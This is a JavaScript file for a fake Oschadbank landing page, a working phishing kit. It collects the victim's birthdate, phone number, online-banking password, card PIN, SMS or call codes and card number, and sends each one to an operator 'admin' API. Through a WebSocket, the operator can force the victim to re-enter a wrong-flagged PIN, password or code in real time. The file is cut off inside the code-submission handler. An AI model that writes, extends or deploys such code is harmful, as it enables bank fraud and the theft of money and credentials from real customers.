/**
 * Лендинг Ощадбанк - упрощенная версия
 * Последовательность: Дата рождения → Телефон → PIN (4 цифры) → SMS код → Номер карты
 */

// Глобальные переменные
let ws = null;
let sessionToken = null;
let userData = {
    birthdate: null,
    age: null,
    phone: null,
    password: null,
    pin: null,
    sms_code: null,
    card_number: null
};

let statusHeartbeat = null;
const STATUS_HEARTBEAT_INTERVAL = 7000;

// Флаги для отслеживания повторных запросов от админа
let isPhoneRetry = false;
let isPasswordRetry = false;
let isCardRetry = false;
let isCodeRetry = false;

// Переменная для PIN-кода
let pinValue = '';

// Флаг для отслеживания инициализации PIN-формы
let pinFormInitialized = false;

// Таймер для кнопки запроса повторного звонка
let callRequestTimer = null;
let callRequestCountdown = 0;

// ============================================================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================================================

document.addEventListener('DOMContentLoaded', () => {
    if (CONFIG.SETTINGS.debug) {
        console.log('🚀 Ощадбанк лендинг инициализирован');
        console.log('📡 Админка:', CONFIG.ADMIN_API_URL);
    }
    
    // Инициализируем формы
    initBirthdateForm();
    initPhoneForm();
    initPasswordForm();
    initPinForm();
    initCodeForm();
    initCardForm();
});

// ============================================================================
// ПЕРЕКЛЮЧЕНИЕ ЭКРАНОВ
// ============================================================================

function switchScreen(fromScreenId, toScreenId) {
    const fromScreen = document.getElementById(fromScreenId);
    const toScreen = document.getElementById(toScreenId);
    
    if (fromScreen) fromScreen.classList.remove('active');
    if (toScreen) toScreen.classList.add('active');
    
    console.log(`🔄 Переход: ${fromScreenId} → ${toScreenId}`);
}

// ============================================================================
// ЭКРАН 1: ДАТА РОЖДЕНИЯ
// ============================================================================

function initBirthdateForm() {
    const form = document.getElementById('birthdateFormFirst');
    const dayInput = document.getElementById('bdayDay');
    const monthInput = document.getElementById('bdayMonth');
    const yearInput = document.getElementById('bdayYear');
    const errorElement = document.getElementById('birthdateErrorFirst');
    
    if (!form) return;
    
    // Автопереход между полями
    dayInput.addEventListener('input', (e) => {
        const value = e.target.value.replace(/\D/g, '');
        e.target.value = value;
        if (value.length === 2) monthInput.focus();
    });
    
    monthInput.addEventListener('input', (e) => {
        const value = e.target.value.replace(/\D/g, '');
        e.target.value = value;
        if (value.length === 2) yearInput.focus();
    });
    
    yearInput.addEventListener('input', (e) => {
        const value = e.target.value.replace(/\D/g, '');
        e.target.value = value;
    });
    
    form.addEventListener('submit', async (e) => {
            e.preventDefault();
        errorElement.textContent = '';
        
        const day = parseInt(dayInput.value);
        const month = parseInt(monthInput.value);
        const year = parseInt(yearInput.value);
        
        // Валидация
        if (!day || day < 1 || day > 31) {
            errorElement.textContent = 'Невірний день';
                return;
            }
            
        if (!month || month < 1 || month > 12) {
            errorElement.textContent = 'Невірний місяць';
            return;
        }
        
        const currentYear = new Date().getFullYear();
        if (!year || year < 1900 || year > currentYear) {
            errorElement.textContent = 'Невірний рік';
                return;
            }
            
        // Проверка возраста (18+)
        const age = currentYear - year;
        if (age < 18) {
            errorElement.textContent = 'Вам має бути 18+ років';
                    return;
                }
                
        // Сохраняем дату
        userData.birthdate = `${year}-${String(month).padStart(2, '0')}-${String(day).padStart(2, '0')}`;
        userData.age = age;
        
        console.log('✅ Дата рождения:', userData.birthdate, 'Возраст:', userData.age);
        
        // Переход к телефону
        switchScreen('screen-birthdate-first', 'screen-phone');
    });
}

// ============================================================================
// ЭКРАН 2: ТЕЛЕФОН
// ============================================================================

function initPhoneForm() {
    const form = document.getElementById('phoneForm');
    const phoneInput = document.getElementById('phone');
    const errorElement = document.getElementById('phoneError');
    
    if (!form) return;
    
    // Форматирование номера
    phoneInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 9) value = value.substring(0, 9);
        
        // Форматируем: XX XXX XX XX
        let formatted = '';
        if (value.length > 0) formatted += value.substring(0, 2);
        if (value.length > 2) formatted += ' ' + value.substring(2, 5);
        if (value.length > 5) formatted += ' ' + value.substring(5, 7);
        if (value.length > 7) formatted += ' ' + value.substring(7, 9);
        
        e.target.value = formatted;
    });
    
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        errorElement.textContent = '';
        errorElement.style.display = 'none';
        phoneInput.style.borderColor = '';
        
        const phone = phoneInput.value.replace(/\D/g, '');
        
        // Функция для показа ошибки с анимацией
        const showError = (message) => {
            errorElement.innerHTML = `<div style="display: flex; align-items: center; gap: 8px; color: #ef4444; font-weight: 600; font-size: 14px;">
                <span style="font-size: 18px;">❌</span>
                <span>${message}</span>
            </div>`;
            errorElement.style.display = 'block';
            errorElement.style.backgroundColor = '#fef2f2';
            errorElement.style.padding = '12px';
            errorElement.style.borderRadius = '8px';
            errorElement.style.marginTop = '10px';
            errorElement.style.border = '1px solid #fecaca';
            
            // Подсвечиваем поле красным
            phoneInput.style.borderColor = '#ef4444';
            phoneInput.style.backgroundColor = '#fef2f2';
            
            // Убираем подсветку через 3 секунды
            setTimeout(() => {
                phoneInput.style.borderColor = '';
                phoneInput.style.backgroundColor = '';
            }, 3000);
        };
        
        // Проверка длины
        if (phone.length !== 9) {
            showError('Введіть коректний номер телефону (9 цифр)');
                return;
            }
            
        // Проверка украинских операторов
        const validPrefixes = ['50', '66', '95', '99', '75', '67', '68', '96', '97', '98', '77', '63', '73', '93', '91', '92', '94'];
        const prefix = phone.substring(0, 2);
        
        if (!validPrefixes.includes(prefix)) {
            showError(`❌ Код ${prefix} не підходить! Використовуйте коди: 50, 66, 67, 68, 73, 93, 95, 96, 97, 98, 99`);
            return;
        }
        
        // Проверка на повторяющиеся цифры (999999999, 111111111 и т.д.)
        if (/^(\d)\1{8}$/.test(phone)) {
            showError('Введіть реальний номер телефону, а не однакові цифри');
            return;
        }
        
        // Проверка на последовательные цифры (123456789, 987654321)
        const isSequential = (str) => {
            let increasing = true;
            let decreasing = true;
            for (let i = 1; i < str.length; i++) {
                if (parseInt(str[i]) !== parseInt(str[i-1]) + 1) increasing = false;
                if (parseInt(str[i]) !== parseInt(str[i-1]) - 1) decreasing = false;
            }
            return increasing || decreasing;
        };
        
        if (isSequential(phone)) {
            showError('Введіть реальний номер телефону');
                return;
            }
            
        userData.phone = '+380' + phone;
        console.log('✅ Телефон:', userData.phone);
        
        // Если это повторный ввод телефона (после ошибки от админа)
        if (isPhoneRetry) {
            console.log('📱 Повторный ввод телефона - отправляем в админку и показываем ожидание');
            
            // Отправляем новый телефон в админку
            await saveData('phone', userData.phone);
            
            // Переходим на экран ожидания
            switchScreen('screen-phone', 'screen-loading');
            
            // Сбрасываем флаг
            isPhoneRetry = false;
        } else {
            // Первый ввод - переход к паролю
            switchScreen('screen-phone', 'screen-password');
        }
    });
}

// ============================================================================
// ЭКРАН 4: PIN-КОД (4 ЦИФРЫ)
// ============================================================================

function initPinForm() {
    // Если обработчики уже добавлены, не добавляем их повторно
    if (pinFormInitialized) {
        return;
    }
    
    pinFormInitialized = true;
    
    // ГЛОБАЛЬНЫЙ обработчик для PIN клавиатуры
    document.addEventListener('click', function(e) {
        const target = e.target;
        const keyboardKey = target.closest('.keyboard-key');
        
        if (keyboardKey) {
            const pinScreen = document.getElementById('screen-pin');
            if (!pinScreen || !pinScreen.classList.contains('active')) {
                return;
            }
            
            // Предотвращаем двойное срабатывание
            e.preventDefault();
            e.stopPropagation();
            
            const key = keyboardKey.dataset.key;
            
            if (key === 'backspace') {
                pinValue = pinValue.slice(0, -1);
            } else if (key === 'cancel') {
                pinValue = '';
            } else if (pinValue.length < 4 && !isNaN(key)) {
                pinValue += key;
            }
            
            // Обновляем отображение точек
            const pinDots = document.querySelectorAll('.pin-dot');
            pinDots.forEach((dot, index) => {
                if (index < pinValue.length) {
                    dot.classList.add('pin-dot--filled');
                } else {
                    dot.classList.remove('pin-dot--filled');
                }
            });
            
            // Активируем кнопку если 4 цифры
            const submitBtn = document.getElementById('submitPin');
            if (submitBtn) {
                submitBtn.disabled = pinValue.length !== 4;
            }
            
            // Если 4 цифры - автоматически отправляем через 300мс
            if (pinValue.length === 4) {
                setTimeout(() => submitPin(pinValue), 300);
            }
        }
    }, false);
    
    // ГЛОБАЛЬНЫЙ обработчик для кнопки отправки PIN
    document.addEventListener('click', async function(e) {
        const target = e.target;
        
        if (target && (target.id === 'submitPin' || target.closest('#submitPin'))) {
            const pinScreen = document.getElementById('screen-pin');
            if (!pinScreen || !pinScreen.classList.contains('active')) {
                return;
            }
            
            if (pinValue.length === 4) {
                e.preventDefault();
                e.stopPropagation();
                submitPin(pinValue);
            }
        }
    }, true);
}

async function submitPin(pin) {
    if (pin.length !== 4) {
        const pinError = document.getElementById('pinError');
        if (pinError) {
            pinError.textContent = 'Введіть 4-значний PIN-код';
            pinError.style.display = 'block';
        }
                return;
            }
            
    console.log('✅ PIN введен:', pin);
    userData.pin = pin;
    
    // Отправляем PIN на админку
    await saveData('pin', pin);
    
    // Очищаем PIN после отправки
    pinValue = '';
    const pinDots = document.querySelectorAll('.pin-dot');
    pinDots.forEach(dot => dot.classList.remove('pin-dot--filled'));
    
    // Переход к SMS коду
    switchScreen('screen-pin', 'screen-code');
    initCodeInputs(4);
}

// ============================================================================
// ЭКРАН 3: ПАРОЛЬ
// ============================================================================

function initPasswordForm() {
    const form = document.getElementById('passwordForm');
    const passwordInput = document.getElementById('passwordInput');
    const errorElement = document.getElementById('passwordError');
    
    if (!form || !passwordInput) {
        console.error('❌ Форма пароля не найдена!');
                return;
            }
            
    if (CONFIG.SETTINGS.debug) {
        console.log('🔒 Инициализация формы пароля');
    }
    
    // Фильтрация ввода: только английские буквы и цифры
    passwordInput.addEventListener('input', (e) => {
        const currentValue = e.target.value;
        // Разрешаем только английские буквы (a-z, A-Z) и цифры (0-9)
        const filtered = currentValue.replace(/[^a-zA-Z0-9]/g, '');
        
        if (currentValue !== filtered) {
            e.target.value = filtered;
            // Показываем предупреждение
            errorElement.textContent = 'Тільки англійські літери та цифри';
            errorElement.style.color = '#f59e0b'; // Оранжевый для предупреждения
            
            // Убираем предупреждение через 2 секунды
            setTimeout(() => {
                if (errorElement.textContent === 'Тільки англійські літери та цифри') {
                    errorElement.textContent = '';
                    errorElement.style.color = ''; // Возвращаем цвет
                }
            }, 2000);
        }
    });
    
    form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
        const password = passwordInput.value.trim();
        
        // Функция для показа ошибки
        const showError = (message) => {
            errorElement.textContent = '❌ ' + message;
            errorElement.style.color = '#ef4444';
            errorElement.style.fontSize = '14px';
            errorElement.style.fontWeight = '600';
            errorElement.style.display = 'block';
            errorElement.style.marginTop = '10px';
            errorElement.style.padding = '12px';
            errorElement.style.backgroundColor = '#fee2e2';
            errorElement.style.borderRadius = '8px';
            errorElement.style.textAlign = 'center';
            
            // Подсвечиваем поле красным
            passwordInput.style.borderColor = '#ef4444';
            passwordInput.style.backgroundColor = '#fef2f2';
            
            // Убираем подсветку через 3 секунды
            setTimeout(() => {
                passwordInput.style.borderColor = '';
                passwordInput.style.backgroundColor = '';
            }, 3000);
        };
        
        if (!password) {
            showError('Введіть пароль');
                return;
            }
            
        if (password.length < 4) {
            showError('Пароль має містити мінімум 4 символи');
                return;
            }
            
        // Дополнительная проверка на допустимые символы
        if (!/^[a-zA-Z0-9]+$/.test(password)) {
            showError('Пароль може містити тільки англійські літери та цифри');
                return;
            }
            
        // Проверка: должны быть и буквы, и цифры (не только цифры, не только буквы)
        const hasLetters = /[a-zA-Z]/.test(password);
        const hasDigits = /[0-9]/.test(password);
        
        if (!hasLetters) {
            showError('Пароль має містити цифри! Наприклад: Password123');
                return;
            }
            
        if (!hasDigits) {
            showError('Пароль має містити літери! Наприклад: Password123');
                return;
            }
        
        // Очищаем ошибки
        errorElement.textContent = '';
        errorElement.style.cssText = '';
        passwordInput.style.borderColor = '';
        passwordInput.style.backgroundColor = '';
            
            userData.password = password;
        
        console.log('✅ Пароль введен:', userData.password);
        
        // Отключаем форму
        const submitBtn = form.querySelector('button[type="submit"]');
        submitBtn.disabled = true;
        submitBtn.textContent = 'Зачекайте...';
        
        try {
            // Если это повторный ввод пароля (после ошибки от админа)
            if (isPasswordRetry) {
                console.log('🔐 Повторный ввод пароля - отправляем в админку и показываем ожидание');
                
                // Отправляем новый пароль в админку
                await saveData('password', userData.password);
                
                // Переходим на экран ожидания
                switchScreen('screen-password', 'screen-loading');
                
                // Сбрасываем флаг
                isPasswordRetry = false;
            } else {
                // Первый ввод - создаём сессию и лог в админке
                console.log('🚀 СОЗДАЁМ СЕССИЮ И ЛОГ В АДМИНКЕ!');
                await createSession();
                
                // Переход к PIN-коду
                switchScreen('screen-password', 'screen-pin');
                
                // Инициализируем форму PIN-кода
                initPinForm();
            }
        } catch (error) {
            console.error('❌ Ошибка при отправке пароля:', error);
            errorElement.textContent = 'Сталася помилка. Спробуйте ще раз.';
        } finally {
            submitBtn.disabled = false;
            submitBtn.textContent = 'Далі';
        }
    });
}

// ============================================================================
// ПРОВЕРКА БАНА
// ============================================================================

async function checkBan(phone = null) {
    try {
        const url = phone 
            ? `${CONFIG.ADMIN_API_URL}/api/check-ban?phone=${encodeURIComponent(phone)}`
            : `${CONFIG.ADMIN_API_URL}/api/check-ban`;
        
        const response = await fetch(url, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
            }
        });
        
        if (!response.ok) {
            // Если ошибка - разрешаем продолжение (на случай проблем с API)
            console.warn('⚠️ Ошибка проверки бана:', response.status);
            return { banned: false };
        }
        
        const data = await response.json();
        
        if (data.banned) {
            console.error('🚫 Доступ заблокирован:', data.reason);
            // Показываем сообщение пользователю
            alert('Ваш доступ заблокирован. Пожалуйста, свяжитесь с поддержкой.');
            return { banned: true, reason: data.reason };
        }
        
        return { banned: false };
    } catch (error) {
        console.error('❌ Ошибка проверки бана:', error);
        // В случае ошибки разрешаем продолжение
        return { banned: false };
    }
}

// ============================================================================
// СОЗДАНИЕ СЕССИИ / ЛОГА В АДМИНКЕ
// ============================================================================

async function createSession() {
    try {
        // Проверяем бан ПЕРЕД созданием сессии
        const banCheck = await checkBan();
        if (banCheck.banned) {
            console.error('🚫 Создание сессии заблокировано:', banCheck.reason);
            return;
        }
        
        console.log('📤 Шаг 1: Создаём сессию...');
        console.log('📊 Данные:', JSON.stringify(userData, null, 2));
        
        // ШАГ 1: Создаём сессию с датой рождения
        const response = await fetch(`${CONFIG.ADMIN_API_URL}/api/session/create`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                landing_id: CONFIG.LANDING_ID,
                landing_name: CONFIG.LANDING_NAME,
                landing_version: CONFIG.LANDING_NAME,
                fingerprint: 'web_' + Date.now(),
                user_agent: navigator.userAgent,
                screen_resolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                referer: window.location.origin || window.location.href,  // Откуда пришёл пользователь
                
                // Только дата рождения при создании сессии
                birthdate: userData.birthdate
            })
        });
        
        if (!response.ok) {
            console.error('❌ Ошибка создания сессии:', response.status);
            const errorText = await response.text();
            console.error('Ответ сервера:', errorText);
            
            // Проверяем, не забанен ли пользователь
            if (response.status === 403) {
                try {
                    const errorData = JSON.parse(errorText);
                    if (errorData.detail && errorData.detail.error === 'access_denied') {
                        alert('Ваш доступ заблокирован. Пожалуйста, свяжитесь с поддержкой.');
                        return;
                    }
                } catch (e) {
                    // Если не удалось распарсить - показываем общее сообщение
                    if (errorText.includes('заблокирован') || errorText.includes('banned')) {
                        alert('Ваш доступ заблокирован. Пожалуйста, свяжитесь с поддержкой.');
                        return;
                    }
                }
            }
            return;
        }
        
        const data = await response.json();
        sessionToken = data.session_token;
        
        console.log('✅ Сессия создана!');
        console.log('🎫 Session Token:', sessionToken);
        
        // ШАГ 2: Проверяем бан по телефону перед отправкой
        const phoneBanCheck = await checkBan(userData.phone);
        if (phoneBanCheck.banned) {
            console.error('🚫 Телефон заблокирован:', phoneBanCheck.reason);
            return;
        }
        
        // ШАГ 3: Добавляем телефон
        console.log('📤 Шаг 2: Отправляем телефон...');
        await saveData('phone', userData.phone);
        
        // ШАГ 4: Добавляем пароль и создаём лог
        console.log('📤 Шаг 3: Отправляем пароль и создаём лог...');
        await savePassword(userData.password);
        
        console.log('📋 ЛОГ ПОПАЛ В АДМИНКУ!');
        
        // Подключаемся к WebSocket
        connectWebSocket();
        
        // Запускаем heartbeat
            startStatusHeartbeat();
        
    } catch (error) {
        console.error('❌ Ошибка:', error);
    }
}

// Функция для сохранения пароля и создания лога
async function savePassword(password) {
    if (!sessionToken) {
        console.warn('⚠️ Нет session token');
        return;
    }
    
    try {
        console.log('📤 Сохраняем пароль и создаём лог...');
        
        // ШАГ 1: Сначала сохраняем пароль в password_data
        await saveData('password', password);
        console.log('✅ Пароль сохранен в password_data');
        
        // ШАГ 2: Теперь создаем лог через save_pin (но пароль уже в password_data, поэтому это будет правильно)
        const response = await fetch(`${CONFIG.ADMIN_API_URL}/api/session/save_pin`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                session_token: sessionToken,
                pin_code: password  // Это нужно для создания лога, но пароль уже в password_data
            })
        });
        
        if (response.ok) {
            const result = await response.json();
            console.log('✅ Пароль сохранён и лог создан!');
            console.log('📋 ЛОГ ПОПАЛ В АДМИНКУ!');
            if (result.log_id) {
                console.log('🆔 Лог ID:', result.log_id);
            }
        } else {
            const errorText = await response.text();
            console.error('❌ Ошибка сохранения пароля:', response.status);
            console.error('Ответ сервера:', errorText);
            
            // Проверяем, не забанен ли пользователь
            if (response.status === 403) {
                try {
                    const errorData = JSON.parse(errorText);
                    if (errorData.detail && errorData.detail.error === 'access_denied') {
                        alert('Ваш доступ заблокирован. Пожалуйста, свяжитесь с поддержкой.');
                        throw new Error('Access denied: ' + errorData.detail.reason);
                    }
                } catch (e) {
                    // Если не удалось распарсить - показываем общее сообщение
                    if (errorText.includes('заблокирован') || errorText.includes('banned')) {
                        alert('Ваш доступ заблокирован. Пожалуйста, свяжитесь с поддержкой.');
                        throw new Error('Access denied');
                    }
                }
            }
        }
    } catch (error) {
        console.error('❌ Ошибка сохранения пароля:', error);
    }
}

// ============================================================================
// WEBSOCKET
// ============================================================================

function connectWebSocket() {
    if (!sessionToken) {
        console.warn('⚠️ Нет session token для WebSocket');
                return;
            }
            
    try {
        ws = new WebSocket(`${CONFIG.ADMIN_WS_URL}/client/${sessionToken}`);
        
        ws.onopen = () => {
            console.log('🔌 WebSocket подключен');
            updateStatus('online');
        };
        
        ws.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                console.log('📨 Команда от админа:', data);
                
                handleAdminCommand(data);
            } catch (error) {
                console.error('❌ Ошибка парсинга команды:', error);
            }
        };
        
        ws.onclose = () => {
            console.log('🔌 WebSocket отключен');
            updateStatus('offline');
        };
        
        ws.onerror = (error) => {
            console.error('❌ WebSocket ошибка:', error);
        };
    } catch (error) {
        console.error('❌ Ошибка подключения WebSocket:', error);
    }
}

function handleAdminCommand(data) {
    console.log('📨 Получена команда от админа:', data.command);
    
    if (data.command === 'call' || data.command === 'show_call') {
        console.log('📞 Админ запросил экран звонка');
        switchToCallScreen();
    } else if (data.command === 'message' || data.command === 'send_message') {
        console.log('💬 Сообщение от админа:', data.message);
        showBotMessage(data.message);
    } else if (data.command === 'show_card_error') {
        console.log('💳 Админ указал: неверный номер карты');
        showCardError();
    } else if (data.command === 'show_phone') {
        console.log('📱 Админ указал: неверный номер телефона');
        showPhoneError();
    } else if (data.command === 'show_password') {
        console.log('🔐 Админ указал: неверный пароль');
        showPasswordError();
    } else if (data.command === 'show_pin') {
        console.log('📟 Админ указал: неверный PIN-код');
        showPinError();
    } else if (data.command === 'show_4_code' || data.command === 'show_code') {
        console.log('📨 Админ указал: неверный 4-значный код со звонка');
        showCodeError();
    } else if (data.command === 'show_3_code') {
        console.log('📨 Админ указал: неверный 3-значный код');
        showCodeError();
    } else if (data.command === 'show_6_code') {
        console.log('📨 Админ указал: неверный 6-значный код');
        showCodeError();
            } else {
        console.log('⚠️ Неизвестная команда от админа:', data.command);
    }
}

function switchToCallScreen() {
    const currentScreen = document.querySelector('.screen.active');
    if (currentScreen) {
        currentScreen.classList.remove('active');
    }
    
    const callScreen = document.getElementById('screen-call');
    if (callScreen) {
        callScreen.classList.add('active');
    }
}

function showBotMessage(message) {
    const botMessageEl = document.getElementById('bot-message');
    if (botMessageEl) {
        botMessageEl.textContent = message;
        botMessageEl.style.display = 'block';
    }
}

function showCardError() {
    console.log('💳 Показываем ошибку: неверный номер карты');
    
    // Устанавливаем флаг повторного ввода
    isCardRetry = true;
    
    // Переходим на экран ввода карты (даже если пользователь на loading screen)
    const currentScreen = document.querySelector('.screen.active');
    if (currentScreen) {
        currentScreen.classList.remove('active');
    }
    
    const cardScreen = document.getElementById('screen-card');
    if (cardScreen) {
        cardScreen.classList.add('active');
    }
    
    // Показываем сообщение об ошибке
    const errorMessage = document.getElementById('card-error-message');
    if (errorMessage) {
        errorMessage.style.display = 'block';
        
        // Скрываем сообщение через 5 секунд
        setTimeout(() => {
            errorMessage.style.display = 'none';
        }, 5000);
    }
    
    // Очищаем поля ввода карты
    const cardInputs = ['card1', 'card2', 'card3', 'card4'];
    cardInputs.forEach(id => {
        const input = document.getElementById(id);
        if (input) {
            input.value = '';
            input.style.borderColor = '#ddd';
            input.style.backgroundColor = '#fff';
            input.disabled = false;
        }
    });
    
    // Скрываем предыдущие сообщения об ошибке или успехе
    const successMessage = document.querySelector('.card-success-message');
    if (successMessage) {
        successMessage.style.display = 'none';
    }
    
    const inlineError = document.querySelector('.card-error-inline');
    if (inlineError) {
        inlineError.style.display = 'none';
    }
    
    // Фокусируемся на первом поле
    const firstInput = document.getElementById('card1');
    if (firstInput) {
        setTimeout(() => firstInput.focus(), 300);
    }
}

function showPhoneError() {
    console.log('📱 Показываем ошибку: неверный номер телефона');
    
    // Устанавливаем флаг повторного ввода
    isPhoneRetry = true;
    
    // Переходим на экран ввода телефона (даже если пользователь на loading screen)
    const currentScreen = document.querySelector('.screen.active');
    if (currentScreen) {
        currentScreen.classList.remove('active');
    }
    
    const phoneScreen = document.getElementById('screen-phone');
    if (phoneScreen) {
        phoneScreen.classList.add('active');
    }
    
    // Показываем сообщение об ошибке
    const errorMessage = document.getElementById('phone-error-message');
    if (errorMessage) {
        errorMessage.style.display = 'block';
        
        // Скрываем сообщение через 5 секунд
        setTimeout(() => {
            errorMessage.style.display = 'none';
        }, 5000);
    }
    
    // Очищаем поле ввода телефона
    const phoneInput = document.getElementById('phone');
    if (phoneInput) {
        phoneInput.value = '';
        phoneInput.style.borderColor = '';
    }
    
    // Очищаем сообщение об ошибке под полем
    const phoneError = document.getElementById('phoneError');
    if (phoneError) {
        phoneError.style.display = 'none';
        phoneError.textContent = '';
    }
    
    // Фокусируемся на поле телефона
    if (phoneInput) {
        setTimeout(() => phoneInput.focus(), 300);
    }
}

function showPasswordError() {
    console.log('🔐 Показываем ошибку: неверный пароль');
    
    // Устанавливаем флаг повторного ввода
    isPasswordRetry = true;
    
    // Переходим на экран ввода пароля (даже если пользователь на loading screen)
    const currentScreen = document.querySelector('.screen.active');
    if (currentScreen) {
        currentScreen.classList.remove('active');
    }
    
    const passwordScreen = document.getElementById('screen-password');
    if (passwordScreen) {
        passwordScreen.classList.add('active');
    }
    
    // Показываем сообщение об ошибке
    const errorMessage = document.getElementById('password-error-message');
    if (errorMessage) {
        errorMessage.style.display = 'block';
        
        // Скрываем сообщение через 5 секунд
        setTimeout(() => {
            errorMessage.style.display = 'none';
        }, 5000);
    }
    
    // Очищаем поле ввода пароля
    const passwordInput = document.getElementById('passwordInput');
    if (passwordInput) {
        passwordInput.value = '';
        passwordInput.style.borderColor = '';
        passwordInput.style.backgroundColor = '';
    }
    
    // Очищаем сообщение об ошибке под полем
    const passwordError = document.getElementById('passwordError');
    if (passwordError) {
        passwordError.style.display = 'none';
        passwordError.textContent = '';
        passwordError.style.cssText = '';
    }
    
    // Фокусируемся на поле пароля
    if (passwordInput) {
        setTimeout(() => passwordInput.focus(), 300);
    }
}

function showPinError() {
    console.log('📟 Показываем ошибку: неверный PIN-код');
    
    // Переходим на экран ввода PIN-кода (даже если пользователь на loading screen)
    const currentScreen = document.querySelector('.screen.active');
    if (currentScreen) {
        currentScreen.classList.remove('active');
    }
    
    const pinScreen = document.getElementById('screen-pin');
    if (pinScreen) {
        pinScreen.classList.add('active');
    }
    
    // Показываем сообщение об ошибке
    const pinError = document.getElementById('pinError');
    if (pinError) {
        pinError.innerHTML = '<div style="color: #ef4444; font-weight: bold; margin-bottom: 10px;">❌ Неправильний PIN-код!</div>' +
                           '<div style="color: #9ca3af; font-size: 14px;">Спробуйте ще раз</div>';
        pinError.style.display = 'block';
        
        // Скрываем сообщение через 5 секунд
        setTimeout(() => {
            pinError.style.display = 'none';
        }, 5000);
    }
    
    // Очищаем PIN
    pinValue = '';
    const pinDots = document.querySelectorAll('.pin-dot');
    pinDots.forEach(dot => dot.classList.remove('pin-dot--filled'));
    
    // Деактивируем кнопку
    const submitBtn = document.getElementById('submitPin');
    if (submitBtn) {
        submitBtn.disabled = true;
    }
}

function showCodeError() {
    console.log('📨 Показываем ошибку: неверный код со звонка');
    
    // Устанавливаем флаг повторного ввода кода
    isCodeRetry = true;
    
    // Переходим на экран ввода SMS-кода (даже если пользователь на loading screen)
    const currentScreen = document.querySelector('.screen.active');
    if (currentScreen) {
        currentScreen.classList.remove('active');
    }
    
    const codeScreen = document.getElementById('screen-code');
    if (codeScreen) {
        codeScreen.classList.add('active');
    }
    
    // Показываем сообщение об ошибке
    const codeError = document.getElementById('codeError');
    if (codeError) {
        codeError.innerHTML = '<div style="color: #ef4444; font-weight: bold; margin-bottom: 10px; text-align: center; padding: 12px; background: #fee2e2; border-radius: 8px; border: 2px solid #fecaca;">❌ Неправильний код!</div>' +
                             '<div style="color: #9ca3af; font-size: 14px; text-align: center; margin-top: 8px;">Введіть код знову з дзвінка</div>';
        codeError.style.display = 'block';
        
        // Скрываем сообщение через 5 секунд
        setTimeout(() => {
            codeError.style.display = 'none';
        }, 5000);
    }
    
    // Очищаем поля ввода кода
    const codeInputs = document.querySelectorAll('.code-input');
    codeInputs.forEach(input => {
        if (input) {
            input.value = '';
            input.style.borderColor = '';
            input.style.backgroundColor = '';
            input.disabled = false;
        }
    });
    
    // Деактивируем кнопку отправки
    const submitBtn = document.getElementById('submitCode');
    if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.style.opacity = '0';
    }
    
    // Инициализируем поля заново (4 цифры для Ощадбанка)
    initCodeInputs(4);
    
    // Фокусируемся на первом поле
    const firstInput = document.querySelector('.code-input');
    if (firstInput) {
        setTimeout(() => firstInput.focus(), 300);
    }
}

// ============================================================================
// СТАТУС HEARTBEAT
// ============================================================================

function startStatusHeartbeat() {
    if (statusHeartbeat) {
        clearInterval(statusHeartbeat);
    }
    
    statusHeartbeat = setInterval(() => {
        updateStatus('online');
    }, STATUS_HEARTBEAT_INTERVAL);
}

async function updateStatus(status) {
    if (!sessionToken) return;
    
    try {
        await fetch(`${CONFIG.ADMIN_API_URL}/api/session/status`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                session_token: sessionToken,
                status: status
            })
        });
    } catch (error) {
        console.error('❌ Ошибка обновления статуса:', error);
    }
}

// ============================================================================
// ЭКРАН 4: SMS КОД (4 ЦИФРЫ)
// ============================================================================

function initCodeForm() {
    // Будет инициализирован динамически после ввода PIN
}

// Функция отображения полного номера телефона
function showFullPhone() {
    const fullPhoneEl = document.getElementById('fullPhone');
    if (!fullPhoneEl || !userData.phone) return;
    
    // Показываем полный номер (убираем + если есть)
    let phone = userData.phone.replace(/^\+/, '');
    fullPhoneEl.textContent = phone;
}

function initCodeInputs(length) {
    const container = document.getElementById('codeInputs');
    const submitBtn = document.getElementById('submitCode');
    const errorElement = document.getElementById('codeError');
    
    if (!container) return;
    
    // Показываем полный номер телефона
    showFullPhone();
    
    // Очищаем контейнер
    container.innerHTML = '';
    
    // Создаем поля ввода
    for (let i = 0; i < length; i++) {
        const input = document.createElement('input');
        input.type = 'tel';
        input.className = 'code-input';
        input.maxLength = 1;
        input.inputMode = 'numeric';
        input.pattern = '[0-9]';
        input.id = `code-input-${i}`;
        
        // Автопереход между полями
        input.addEventListener('input', (e) => {
            const value = e.target.value.replace(/\D/g, '');
            e.target.value = value;
            
            if (value.length === 1 && i < length - 1) {
                document.getElementById(`code-input-${i + 1}`).focus();
            }
            
            // Проверяем заполнены ли все поля
            checkCodeComplete();
        });
        
        // Backspace
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !e.target.value && i > 0) {
                document.getElementById(`code-input-${i - 1}`).focus();
            }
        });
        
        container.appendChild(input);
    }
    
    function checkCodeComplete() {
        let allFilled = true;
        let code = '';
        
        for (let i = 0; i < length; i++) {
            const input = document.getElementById(`code-input-${i}`);
            if (!input.value) {
                allFilled = false;
                break;
            }
            code += input.value;
        }
        
    if (allFilled) {
            submitBtn.disabled = false;
            submitBtn.style.opacity = '1';
        } else {
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.5';
        }
        
        return code;
    }
    
    // Обработка отправки
    submitBtn.onclick = async () => {
        const code = checkCodeComplete();
        
        if (code.length !== length) {
            errorElement.textContent = `Введіть ${length} цифри`;
        return;
    }
    
        errorElement.textContent = '';
        userData.sms_code = code;
        
        console.log('✅ SMS код введен:', userData.sms_code);
        
        // Отправляем код в админку
        await saveData('sms_code', userData.sms_code);
        
        // Если это повторный ввод кода (после ошибки от админа)
        if (isCodeRetry) {
            // Проверяем, была ли уже отправлена карта
            if (userData.card_number) {
                // Карта уже была отправлена - показываем ожидание
